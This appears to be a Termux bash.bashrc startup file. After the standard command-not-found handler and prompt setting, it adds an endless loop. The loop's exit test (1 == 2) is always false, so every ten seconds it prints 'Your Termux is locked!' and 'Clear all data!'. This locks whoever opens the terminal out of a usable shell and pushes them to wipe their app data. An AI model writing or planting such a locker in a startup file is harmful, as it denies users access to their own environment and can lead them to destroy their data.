if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
	command_not_found_handle() {
		/data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
	}
fi

PS1='\$ '
loop=true

while $loop; do
	echo -e "\e[1;;34mYour Termux is locked!\e[0m"
	sleep 10
	if [[ (1 == 2) ]]; then
	loop=false
	else
	echo -e "\e[1;;45mClear all data!\e[0m"
	fi
	done